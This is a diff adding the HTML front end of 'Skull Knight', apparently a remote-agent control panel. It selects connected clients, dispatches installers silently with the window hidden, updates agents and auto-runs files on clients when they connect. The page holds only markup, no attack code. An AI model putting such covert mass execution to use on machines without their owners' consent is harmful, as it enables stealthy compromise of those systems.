@@ -1,0 +1,349 @@
+<!doctype html>
+<html lang="en" class="dark">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Execution - Skull Knight</title>
+    <link rel="icon" type="image/x-icon" href="/assets/favicon.ico" />
+    <link rel="stylesheet" href="/assets/tailwind.css" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+    <link rel="stylesheet" href="/assets/main.css" />
+    <link rel="stylesheet" href="/assets/custom.css" />
+    <script defer src="/assets/toast.js"></script>
+    <script defer src="/assets/ripple.js"></script>
+  </head>
+  <body class="min-h-screen bg-slate-950 text-slate-100">
+    <header id="top-nav"></header>
+
+    <main class="w-full px-4 sm:px-6 lg:px-8 py-8">
+      <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+        <!-- Client Selector -->
+        <div class="lg:col-span-3">
+          <div class="bg-slate-900/70 rounded-xl border border-slate-800 p-6">
+            <div class="flex items-center justify-between mb-4">
+              <div>
+                <h2 class="text-xl font-semibold">Select Target Clients</h2>
+                <p class="text-sm text-slate-400">
+                  Admin-only silent execution for installs and programs
+                </p>
+              </div>
+              <div class="flex items-center gap-2 text-sm text-slate-400">
+                <span id="selected-count">0 selected</span>
+                <button
+                  id="clear-selection-btn"
+                  class="px-3 py-1 rounded-lg border border-slate-700 bg-slate-800/50 hover:bg-slate-700 transition-colors"
+                >
+                  <i class="fa-solid fa-xmark"></i> Clear
+                </button>
+              </div>
+            </div>
+
+            <!-- Search and Filters -->
+            <div class="flex gap-3 mb-4">
+              <div class="flex-1 relative">
+                <i class="fa-solid fa-search absolute left-3 top-1/2 -translate-y-1/2 text-slate-500"></i>
+                <input
+                  id="client-search"
+                  type="text"
+                  placeholder="Search by hostname, ID, or OS..."
+                  class="w-full pl-10 pr-4 py-2 rounded-lg border border-slate-700 bg-slate-800 text-slate-100 placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-cyan-500"
+                />
+              </div>
+              <select
+                id="os-filter"
+                class="px-4 py-2 rounded-lg border border-slate-700 bg-slate-800 text-slate-100"
+              >
+                <option value="all">All OS</option>
+              </select>
+              <button
+                id="select-all-btn"
+                class="px-4 py-2 rounded-lg border border-slate-700 bg-slate-800/50 hover:bg-slate-700 transition-colors whitespace-nowrap"
+              >
+                <i class="fa-solid fa-check-double"></i> Select All
+              </button>
+            </div>
+
+            <!-- Client List -->
+            <div
+              id="client-list"
+              class="max-h-64 overflow-y-auto border border-slate-700 rounded-lg bg-slate-950"
+            >
+              <div class="p-4 text-center text-slate-500">Loading clients...</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Upload & Execution Form -->
+        <div class="lg:col-span-3">
+          <div class="bg-slate-900/70 rounded-xl border border-slate-800 p-6">
+            <div class="flex items-center justify-between mb-4">
+              <div>
+                <h2 class="text-xl font-semibold">Execution</h2>
+                <p class="text-sm text-slate-400">
+                  Upload an installer and dispatch it to matching clients
+                </p>
+              </div>
+              <div class="flex flex-wrap items-center gap-2">
+                <button
+                  id="execute-btn"
+                  class="px-6 py-2 rounded-lg bg-cyan-600 hover:bg-cyan-700 text-white font-semibold disabled:opacity-50 disabled:cursor-not-allowed flex items-center gap-2"
+                >
+                  <i class="fa-solid fa-rocket"></i> Run Silently
+                </button>
+                <button
+                  id="update-btn"
+                  class="px-6 py-2 rounded-lg bg-emerald-600 hover:bg-emerald-700 text-white font-semibold disabled:opacity-50 disabled:cursor-not-allowed flex items-center gap-2"
+                >
+                  <i class="fa-solid fa-rotate"></i> Update Agent
+                </button>
+              </div>
+            </div>
+
+            <div class="space-y-4">
+              <div>
+                <!-- Source mode tabs -->
+                <div class="flex gap-1 mb-3 p-1 rounded-lg bg-slate-950/60 border border-slate-800 w-fit">
+                  <button id="tab-upload" class="px-4 py-1.5 rounded-md text-sm font-medium bg-slate-700 text-slate-100 transition-colors">
+                    <i class="fa-solid fa-cloud-arrow-up mr-1"></i> Upload File
+                  </button>
+                  <button id="tab-url" class="px-4 py-1.5 rounded-md text-sm font-medium text-slate-400 hover:text-slate-100 transition-colors">
+                    <i class="fa-solid fa-link mr-1"></i> File URL
+                  </button>
+                </div>
+
+                <!-- Upload panel -->
+                <div id="panel-upload">
+                  <div
+                    id="upload-zone"
+                    class="border-2 border-dashed border-slate-700 rounded-xl p-6 bg-slate-950/60 hover:border-cyan-500 transition-colors cursor-pointer"
+                  >
+                    <div class="flex items-center gap-4">
+                      <div class="w-12 h-12 rounded-full bg-cyan-900/40 flex items-center justify-center text-cyan-300">
+                        <i class="fa-solid fa-cloud-arrow-up"></i>
+                      </div>
+                      <div>
+                        <div class="font-semibold text-slate-100">Drag & drop an installer</div>
+                        <div class="text-sm text-slate-400">or click to select a file</div>
+                      </div>
+                    </div>
+                    <input id="upload-input" type="file" class="hidden" />
+                  </div>
+                </div>
+
+                <!-- URL panel -->
+                <div id="panel-url" class="hidden">
+                  <div class="flex gap-2">
+                    <input
+                      id="url-input"
+                      type="text"
+                      placeholder="https://example.com/installer.exe"
+                      class="flex-1 px-4 py-2 rounded-lg border border-slate-700 bg-slate-950 text-slate-100 placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-cyan-500"
+                    />
+                    <button
+                      id="fetch-url-btn"
+                      class="px-4 py-2 rounded-lg bg-cyan-700 hover:bg-cyan-600 text-white font-semibold flex items-center gap-2 whitespace-nowrap"
+                    >
+                      <i class="fa-solid fa-download"></i> Fetch
+                    </button>
+                  </div>
+                  <p class="text-xs text-slate-500 mt-1">The server will download the file and stage it for dispatch.</p>
+                </div>
+
+                <div class="mt-3 text-sm text-slate-400" id="upload-status">
+                  No file uploaded yet.
+                </div>
+                <div class="mt-2 inline-flex items-center gap-2 text-xs px-2.5 py-1 rounded-full border border-slate-700 text-slate-400" id="os-badge">
+                  OS: not detected
+                </div>
+              </div>
+
+              <div>
+                <label class="block text-sm font-medium text-slate-300 mb-2"
+                  >Arguments (optional)</label
+                >
+                <input
+                  id="exec-args"
+                  type="text"
+                  placeholder="e.g. /quiet /norestart"
+                  class="w-full px-4 py-2 rounded-lg border border-slate-700 bg-slate-950 text-slate-100 placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-cyan-500"
+                />
+                <p class="text-xs text-slate-500 mt-1">
+                  Provide silent flags supported by the installer.
+                </p>
+              </div>
+
+              <label class="flex items-center gap-3 rounded-lg border border-slate-800 bg-slate-950/60 px-4 py-3 text-sm text-slate-300">
+                <input id="hide-window-toggle" type="checkbox" class="w-4 h-4 rounded border-slate-600 bg-slate-700" checked />
+                <div class="flex flex-col">
+                  <span class="font-semibold">Hide window (Windows)</span>
+                  <span class="text-xs text-slate-500">Runs without showing a console window when supported.</span>
+                </div>
+              </label>
+
+              <div class="rounded-lg border border-slate-800 bg-slate-950/60 p-4 text-sm text-slate-300">
+                <div class="font-semibold mb-2">Common examples</div>
+                <ul class="space-y-1 text-slate-400">
+                  <li>MSI: /quiet /norestart</li>
+                  <li>AV setup: /quiet /norestart</li>
+                  <li>Shell installers: --silent --noconfirm</li>
+                </ul>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Output -->
+        <div class="lg:col-span-3">
+          <div class="bg-slate-900/70 rounded-xl border border-slate-800 p-6">
+            <div class="flex items-center justify-between mb-4">
+              <h2 class="text-xl font-semibold">Dispatch Results</h2>
+              <button
+                id="clear-output-btn"
+                class="px-4 py-2 rounded-lg border border-slate-700 bg-slate-800/50 hover:bg-slate-700 text-sm"
+              >
+                <i class="fa-solid fa-trash"></i> Clear
+              </button>
+            </div>
+            <div
+              id="output-container"
+              class="min-h-64 max-h-96 overflow-auto px-4 py-3 rounded-lg border border-slate-700 bg-slate-950 text-slate-100 font-mono text-sm whitespace-pre-wrap"
+            >
+              <div class="text-slate-500">
+                No commands dispatched yet.
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Auto Start -->
+        <div class="lg:col-span-3">
+          <div class="bg-slate-900/70 rounded-xl border border-slate-800 p-6">
+            <div class="flex items-center justify-between mb-4">
+              <div>
+                <h2 class="text-xl font-semibold">Auto Start</h2>
+                <p class="text-sm text-slate-400">
+                  Automatically deploy and run a file on clients when they connect
+                </p>
+              </div>
+            </div>
+
+            <div class="space-y-4">
+              <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div>
+                  <label class="block text-sm font-medium text-slate-300 mb-1">Task Name</label>
+                  <input
+                    id="auto-deploy-name"
+                    type="text"
+                    placeholder="e.g. Deploy monitoring agent"
+                    class="w-full px-4 py-2 rounded-lg border border-slate-700 bg-slate-950 text-slate-100 placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-cyan-500"
+                  />
+                </div>
+                <div>
+                  <label class="block text-sm font-medium text-slate-300 mb-1">Trigger</label>
+                  <select
+                    id="auto-deploy-trigger"
+                    class="w-full px-4 py-2 rounded-lg border border-slate-700 bg-slate-800 text-slate-100"
+                  >
+                    <option value="on_connect">On connect (every session)</option>
+                    <option value="on_connect_once">On connect (only once per client)</option>
+                    <option value="on_first_connect">On first connect (new clients only)</option>
+                  </select>
+                </div>
+              </div>
+
+              <div>
+                <label class="block text-sm font-medium text-slate-300 mb-1">File to Deploy</label>
+                <div
+                  id="auto-deploy-zone"
+                  class="border-2 border-dashed border-slate-700 rounded-xl p-4 bg-slate-950/60 hover:border-cyan-500 transition-colors cursor-pointer"
+                >
+                  <div class="flex items-center gap-4">
+                    <div class="w-10 h-10 rounded-full bg-cyan-900/40 flex items-center justify-center text-cyan-300">
+                      <i class="fa-solid fa-cloud-arrow-up text-sm"></i>
+                    </div>
+                    <div>
+                      <div class="font-semibold text-slate-100 text-sm">Drag & drop a file</div>
+                      <div class="text-xs text-slate-400">or click to select</div>
+                    </div>
+                  </div>
+                  <input id="auto-deploy-file-input" type="file" class="hidden" />
+                </div>
+                <div class="mt-1 text-xs text-slate-400" id="auto-deploy-file-status">No file selected</div>
+              </div>
+
+              <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div>
+                  <label class="block text-sm font-medium text-slate-300 mb-1">Arguments (optional)</label>
+                  <input
+                    id="auto-deploy-args"
+                    type="text"
+                    placeholder="e.g. /quiet /norestart"
+                    class="w-full px-4 py-2 rounded-lg border border-slate-700 bg-slate-950 text-slate-100 placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-cyan-500"
+                  />
+                </div>
+                <div>
+                  <label class="block text-sm font-medium text-slate-300 mb-1">OS Filter <span class="text-slate-500">(unchecked = any)</span></label>
+                  <div class="flex flex-wrap gap-x-4 gap-y-1.5 mt-1">
+                    <label class="flex items-center gap-1.5 text-sm text-slate-300 cursor-pointer">
+                      <input type="checkbox" name="auto-deploy-os" value="windows" class="w-4 h-4 rounded accent-cyan-500"> Windows
+                    </label>
+                    <label class="flex items-center gap-1.5 text-sm text-slate-300 cursor-pointer">
+                      <input type="checkbox" name="auto-deploy-os" value="linux" class="w-4 h-4 rounded accent-cyan-500"> Linux
+                    </label>
+                    <label class="flex items-center gap-1.5 text-sm text-slate-300 cursor-pointer">
+                      <input type="checkbox" name="auto-deploy-os" value="darwin" class="w-4 h-4 rounded accent-cyan-500"> macOS
+                    </label>
+                    <label class="flex items-center gap-1.5 text-sm text-slate-300 cursor-pointer">
+                      <input type="checkbox" name="auto-deploy-os" value="android" class="w-4 h-4 rounded accent-cyan-500"> Android
+                    </label>
+                    <label class="flex items-center gap-1.5 text-sm text-slate-300 cursor-pointer">
+                      <input type="checkbox" name="auto-deploy-os" value="freebsd" class="w-4 h-4 rounded accent-cyan-500"> FreeBSD
+                    </label>
+                  </div>
+                </div>
+              </div>
+
+              <label class="flex items-center gap-3 rounded-lg border border-slate-800 bg-slate-950/60 px-4 py-3 text-sm text-slate-300">
+                <input id="auto-deploy-hide-window" type="checkbox" class="w-4 h-4 rounded border-slate-600 bg-slate-700" checked />
+                <div class="flex flex-col">
+                  <span class="font-semibold">Hide window (Windows)</span>
+                  <span class="text-xs text-slate-500">Runs without showing a console window.</span>
+                </div>
+              </label>
+
+              <div class="flex items-center gap-2">
+                <button
+                  id="auto-deploy-save-btn"
+                  class="px-5 py-2 rounded-lg bg-cyan-600 hover:bg-cyan-700 text-white font-semibold flex items-center gap-2"
+                >
+                  <i class="fa-solid fa-bolt"></i> Save Auto Start
+                </button>
+                <button
+                  id="auto-deploy-cancel-btn"
+                  class="px-5 py-2 rounded-lg bg-slate-700 hover:bg-slate-600 text-white font-semibold hidden"
+                >
+                  Cancel
+                </button>
+              </div>
+            </div>
+
+            <div class="mt-6">
+              <div class="text-sm text-slate-400 mb-2">Active Auto Start Rules</div>
+              <div id="auto-deploy-list" class="space-y-2 max-h-96 overflow-auto">
+                <div class="text-slate-500 text-sm">Loading...</div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </main>
+
+    <script type="module" src="/assets/nav.js"></script>
+    <script type="module" src="/assets/deploy.js"></script>
+  </body>
+</html>
